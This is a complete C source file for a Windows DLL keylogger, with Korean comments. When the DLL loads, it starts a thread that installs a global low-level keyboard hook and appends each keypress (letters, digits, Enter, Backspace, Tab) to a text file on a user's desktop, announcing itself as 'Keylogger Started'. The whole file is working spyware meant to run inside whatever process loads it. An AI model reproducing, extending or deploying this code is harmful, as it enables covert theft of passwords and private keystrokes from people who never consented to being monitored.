#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"

static HHOOK g_hHook = NULL;

void LogKey(int vkCode) {
    FILE* fp = fopen(LOG_FILE, "a");
    if (!fp) return;

    if ((vkCode >= 0x41 && vkCode <= 0x5A) || (vkCode >= 0x30 && vkCode <= 0x39)) {
        fputc((char)vkCode, fp);
    }
    else if (vkCode == VK_SPACE) fputc(' ', fp);
    else if (vkCode == VK_RETURN) fprintf(fp, "[ENTER]\n");
    else if (vkCode == VK_BACK) fprintf(fp, "[BACK]");
    else if (vkCode == VK_TAB) fprintf(fp, "[TAB]");

    fflush(fp);
    fclose(fp);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        // 키가 눌렸을 때만 (떼어질 때는 무시)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            LogKey(pKb->vkCode);
        }
    }
    
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

DWORD WINAPI HookThread(LPVOID param) {
    FILE* fp = fopen(LOG_FILE, "a");
    if (fp) {
        fprintf(fp, "\n=== Keylogger Started (PID: %d, Hook Method) ===\n", GetCurrentProcessId());
        fclose(fp);
    }

    // 키보드 후킹 설치
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    if (!g_hHook) {
        return 1;
    }

    // 메시지 루프
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
    }
    return TRUE;
}
